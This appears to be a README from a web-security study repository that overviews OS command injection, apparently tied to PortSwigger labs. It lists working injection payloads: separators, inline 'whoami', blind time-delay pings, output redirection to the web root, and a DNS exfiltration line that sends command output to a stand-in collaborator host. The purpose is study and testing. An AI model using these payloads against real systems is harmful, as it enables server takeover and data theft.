# OS command injection (shell injection) - topic overview & router

User input reaches an OS shell command unsanitized, so shell metacharacters let you run arbitrary commands as the app's user -> typically **full server compromise** and pivot into the internal network. The highest-severity injection class.

## 30-second quick reference

```
# separators (Windows + Unix):  &   &&   |   ||
# Unix-only:                     ;   \n (0x0a)   `cmd`   $(cmd)
1|whoami                         # inline, output reflected
& echo MARKER &                 # detect (echo reflected)
x||ping -c 10 127.0.0.1||       # blind: 10s delay = injected
||whoami>/var/www/images/o.txt||  ; then fetch /o.txt   # blind: output redirect
x||nslookup x.COLLAB||          # blind: OAST detection
||nslookup `whoami`.COLLAB||    # blind: OAST exfil (output in subdomain)
# initial recon: whoami | uname -a (Win: ver) | id | ifconfig/ipconfig /all
```

## Decision map

| Observation | Go to | Why |
|---|---|---|
| Command output reflected in response | [Basics](Basics/) | inline `|`/`&` + `whoami`, read output |
| Output NOT reflected (feedback/email/async) | [Blind](Blind/) | time delay, output->file, OAST detect + exfil |

## Sub-technique folders
- `Basics/` - in-band injection with reflected output (1 lab)
- `Blind/` - time delays, output redirection to web root, OAST detection + DNS exfiltration (4 labs)

## Root cause
App calls a shell (`system()`, backticks, `Runtime.exec` with a shell, `sh -c`) concatenating user input. Shell metacharacters (`& | ; \n` `` ` `` `$()`) break out of the intended command. If your input is quoted, close the quote first (`"`/`'`).

## Find it
- Params feeding legacy/reporting/utility features: stock checks, ping/traceroute, PDF/image conversion, email/feedback, filenames, DNS lookups.
- Inject `& echo MARKER &` (reflected) or `||ping -c10 127.0.0.1||` (timing) / OAST. Append a trailing separator so the rest of the original command doesn't break yours.

## Chaining
- -> **RCE / full compromise** (this IS RCE); pivot to internal network (-> [SSRF](../SSRF/) territory).
- Reachable via other injections: [SSTI](../SSTI/), [Insecure-deserialization](../Insecure-deserialization/), [XXE](../XXE-injection/), SQLi stacked queries.
- OAST toolkit shared with blind [SQLi OAST](../SQL-injection/Out-of-band-OAST/) and [SSRF Blind](../SSRF/Blind/).

## Tools
- **Burp Repeater** (inject metacharacters), **Burp Collaborator** (blind OAST), **Burp Scanner**.

## References
- https://portswigger.net/web-security/os-command-injection
